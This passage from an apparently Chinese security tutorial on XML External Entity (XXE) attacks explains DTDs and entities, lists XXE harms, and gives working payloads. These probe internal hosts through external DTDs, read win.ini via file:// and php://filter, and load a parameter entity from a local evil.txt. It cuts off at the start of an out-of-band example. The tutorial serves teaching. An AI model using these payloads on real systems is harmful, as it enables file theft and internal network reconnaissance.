href=#%e9%98%b2%e5%be%a1 aria-label=防御>防御</a></li><li><a href=#%e6%89%a9%e5%b1%95%e9%98%85%e8%af%bb aria-label=扩展阅读>扩展阅读</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p><strong>本文发自 <a href=https://xz.aliyun.com/t/2571>先知社区</a> ，转载请注明出处。</strong></p><p>（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）</p><h1 id=what>WHAT<a hidden class=anchor aria-hidden=true href=#what>#</a></h1><h2 id=xml>XML<a hidden class=anchor aria-hidden=true href=#xml>#</a></h2><p>XML是类似HTML的标记语言，但它们有所不同。</p><ul><li>其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。</li><li>其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。</li><li>此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。</li><li><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?></code> 称为 <code>XML prolog</code> ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</li></ul><h2 id=dtd>DTD<a hidden class=anchor aria-hidden=true href=#dtd>#</a></h2><p>XML元素以形如 <code>&lt;tag>foo&lt;/tag></code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; > & ' "</code> 。</p><p>实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p>DTD有两种形式：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dtd data-lang=dtd><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>内部</span> <span style=color:#960050;background-color:#1e0010>DTD：</span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>[</span><span style=color:#960050;background-color:#1e0010>元素声明</span><span style=color:#66d9ef>]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>外部</span> <span style=color:#960050;background-color:#1e0010>DTD：</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>SYSTEM</span> <span style=color:#e6db74>&#34;存放元素声明的文件的URI，可以是本地文件或网络文件&#34;</span> <span style=color:#66d9ef>[</span><span style=color:#960050;background-color:#1e0010>可选的元素声明</span><span style=color:#66d9ef>]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>PUBLIC</span> <span style=color:#e6db74>&#34;PUBLIC_ID DTD的名称&#34;</span> <span style=color:#e6db74>&#34;外部DTD文件的URI&#34;</span><span style=color:#66d9ef>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>（</span> <span style=color:#66d9ef>PUBLIC</span><span style=color:#960050;background-color:#1e0010>表示</span> <span style=color:#960050;background-color:#1e0010>DTD文件是公共的，解析器先分析</span> <span style=color:#960050;background-color:#1e0010>DTD名称，没查到再去访问</span> <span style=color:#960050;background-color:#1e0010>URI）</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=entity>ENTITY<a hidden class=anchor aria-hidden=true href=#entity>#</a></h2><p>我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dtd data-lang=dtd><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>声明：</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>[&lt;!ENTITY</span> 内部普通实体名 <span style=color:#e6db74>&#34;实体所代表的字符串&#34;</span><span style=color:#66d9ef>&gt;]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>[&lt;!ENTITY</span> 外部普通实体名 <span style=color:#66d9ef>SYSTEM</span> <span style=color:#e6db74>&#34;外部实体的URI&#34;</span><span style=color:#66d9ef>&gt;]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>[&lt;!ENTITY</span> % 内部参数实体名 <span style=color:#e6db74>&#34;实体所代表的字符串&#34;</span><span style=color:#66d9ef>&gt;]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>&lt;!DOCTYPE</span> <span style=color:#f92672>根元素</span> <span style=color:#66d9ef>[&lt;!ENTITY</span> % 外部参数实体名 <span style=color:#66d9ef>SYSTEM</span> <span style=color:#e6db74>&#34;外部实体的URI&#34;</span><span style=color:#66d9ef>&gt;]&gt;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>除了</span> <span style=color:#66d9ef>SYSTEM</span><span style=color:#960050;background-color:#1e0010>关键字外，外部实体还可用</span> <span style=color:#66d9ef>PUBLIC</span><span style=color:#960050;background-color:#1e0010>关键字声明。</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>引用：</span>
</span></span><span style=display:flex><span>&amp;普通实体名; <span style=color:#960050;background-color:#1e0010>//经实验，普通实体既可以在</span> <span style=color:#960050;background-color:#1e0010>DTD中，也可以在</span> <span style=color:#960050;background-color:#1e0010>XML中引用，可以在声明前引用，可以在在元素声明内部引用</span>
</span></span><span style=display:flex><span>%参数实体名; <span style=color:#960050;background-color:#1e0010>//经实验，参数实体只能在</span> <span style=color:#960050;background-color:#1e0010>DTD中引用，不能在声明前引用</span><span style=color:#f92672>,</span><span style=color:#960050;background-color:#1e0010>不能在元素声明内部引用</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=可能造成的危害>可能造成的危害<a hidden class=anchor aria-hidden=true href=#可能造成的危害>#</a></h2><ul><li>本地文件读取</li><li>内网访问，主机/端口扫描</li><li>网络访问</li><li>系统命令执行（特定协议，如PHP的expect）</li><li>拒绝服务（嵌套引用，指数爆炸）</li></ul><h1 id=how>HOW<a hidden class=anchor aria-hidden=true href=#how>#</a></h1><p>URI支持的协议：</p><p><img loading=lazy src=913e7e098eebe785c.png alt></p><h2 id=利用引用外部dtd发起网络请求>利用引用外部DTD发起网络请求<a hidden class=anchor aria-hidden=true href=#利用引用外部dtd发起网络请求>#</a></h2><p><code>test.php</code> 使用外部DTD对XML进行验证，如果XML可以注入且DTD的URI可控，就有发起网络请求的可能。在<code>192.168.1.2:80</code> 有Web服务而<code>192.168.1.3:80</code> 没有，DTD的URI不同时访问 <code>test.php</code> 就会得到不同的响应。</p><p>test.php</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// error_reporting(0);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$dom <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DOMDocument</span>;
</span></span><span style=display:flex><span>$dom<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>load</span>(<span style=color:#e6db74>&#39;with_external_dtd.xml&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($dom<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>validate</span>()) {<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;validated!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;invalid!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span></code></pre></td></tr></table></div></div><p>with_external_dtd.xml</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- 很快返回 validated! --&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!DOCTYPE note SYSTEM &#34;external_dtd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- 很快返回 invalid! --&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!-- &lt;!DOCTYPE note SYSTEM &#34;http://192.168.1.2/&#34;&gt; --&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- 很长一段时间才返回 invalid! --&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!-- &lt;!DOCTYPE note SYSTEM &#34;http://192.168.1.3/&#34;&gt; --&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;note&gt;</span>Valar Morghulis<span style=color:#f92672>&lt;/note&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>external_dtd</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dtd data-lang=dtd><span style=display:flex><span><span style=color:#66d9ef>&lt;!ELEMENT</span> <span style=color:#f92672>note</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>#PCDATA</span><span style=color:#f92672>)</span><span style=color:#66d9ef>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=利用普通xxe读取文件访问网络>利用普通XXE读取文件/访问网络<a hidden class=anchor aria-hidden=true href=#利用普通xxe读取文件访问网络>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$s<span style=color:#f92672>=&lt;&lt;&lt;</span><span style=color:#a6e22e>string</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>DOCTYPE</span> <span style=color:#a6e22e>a</span> [<span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>ENTITY</span> <span style=color:#a6e22e>b</span> <span style=color:#a6e22e>SYSTEM</span> <span style=color:#e6db74>&#34;file:///C:/Windows/win.ini&#34;</span><span style=color:#f92672>&gt;</span>]<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>&gt;&amp;</span><span style=color:#a6e22e>b</span>;<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>c</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>string</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>simplexml_load_string</span>($s);
</span></span></code></pre></td></tr></table></div></div><h2 id=利用参数xxe读取文件访问网络>利用参数XXE读取文件/访问网络<a hidden class=anchor aria-hidden=true href=#利用参数xxe读取文件访问网络>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$s<span style=color:#f92672>=&lt;&lt;&lt;</span><span style=color:#a6e22e>string</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>DOCTYPE</span> <span style=color:#a6e22e>a</span> [<span style=color:#f92672>&lt;!</span><span style=color:#a6e22e>ENTITY</span> <span style=color:#f92672>%</span> <span style=color:#a6e22e>b</span> <span style=color:#a6e22e>SYSTEM</span> <span style=color:#e6db74>&#34;http://127.0.0.1:8088/evil.txt&#34;</span><span style=color:#f92672>&gt;%</span><span style=color:#a6e22e>b</span>;]<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>c</span><span style=color:#f92672>&gt;&amp;</span><span style=color:#a6e22e>d</span>;<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>c</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>string</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>simplexml_load_string</span>($s);
</span></span><span style=display:flex><span><span style=color:#75715e>// evil.txt :  &lt;!ENTITY d SYSTEM &#34;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&#34;&gt;
</span></span></span></code></pre></td></tr></table></div></div><h2 id=xxe-oob>XXE OOB<a hidden class=anchor aria-hidden=true href=#xxe-oob>#</a></h2><p>如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 <code>%file;</code> 必须放在外部文件里，因为根据这条 <a href=https://www.w3.org/TR/xml/#wfc-PEinInternalSubset>规则</a> ，在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： <code>PEReferences forbidden in internal subset</code> 。这里的<code>internal subset</code> 指的是中括号<code>[]</code> 内部的一系列元素声明，<code>PEReferences</code> 指的应该是参数实体引用 <code>Parameter-Entity Reference</code> 。</p><p>感觉在技术方面英文的表达力更强，这种情况叫做 <code>fetch external parsed entities using PEReference</code> 更好理解。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
